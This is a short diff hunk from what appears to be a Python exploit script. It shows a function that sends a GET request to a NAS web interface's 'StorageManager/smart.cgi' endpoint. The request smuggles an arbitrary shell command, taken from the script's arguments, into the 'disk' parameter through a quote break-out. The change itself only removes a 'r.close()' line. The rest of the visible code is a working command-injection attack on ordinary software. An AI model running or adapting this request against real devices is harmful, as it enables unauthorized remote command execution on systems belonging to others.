@@ -58,7 +58,6 @@ def exploit(target):
         url = ("http://{0}/webman/modules/StorageManager/smart.cgi?action=apply&operation=quick&disk=/dev/sda'{1}''".format(target, args.cmd))
         r=requests.get(url)
         stat = r.status_code
-        r.close()
         return(stat)
     except Exception as e:
         print(Color.red("[+] Error: ")+" {0}".format(e))
